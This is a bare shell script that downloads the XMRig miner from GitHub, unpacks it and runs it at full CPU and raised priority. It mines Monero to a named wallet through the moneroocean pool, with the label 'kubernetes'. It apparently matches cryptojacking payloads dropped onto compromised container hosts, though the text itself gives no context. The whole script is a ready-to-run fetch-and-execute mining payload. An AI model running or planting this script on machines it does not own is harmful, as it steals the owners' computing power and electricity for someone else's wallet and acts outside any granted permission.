wget https://github.com/xmrig/xmrig/releases/download/v2.13.1/xmrig-2.13.1-xenial-x64.tar.gz
tar -vxf xmrig-2.13.1-xenial-x64.tar.gz
cd xmrig-2.13.1
./xmrig -o gulf.moneroocean.stream:80 -u 4AdbjqR7UuPf44divebPM1YKs2n6UARhEERk9veCu43vg8AcE3E1KBYGuaFxHhndarajwzbCVgnNVXqPhnZDEuhU2PD8fYb -p kubernetes --max-cpu-usage=100 --cpu-priority=5 --donate-level=1

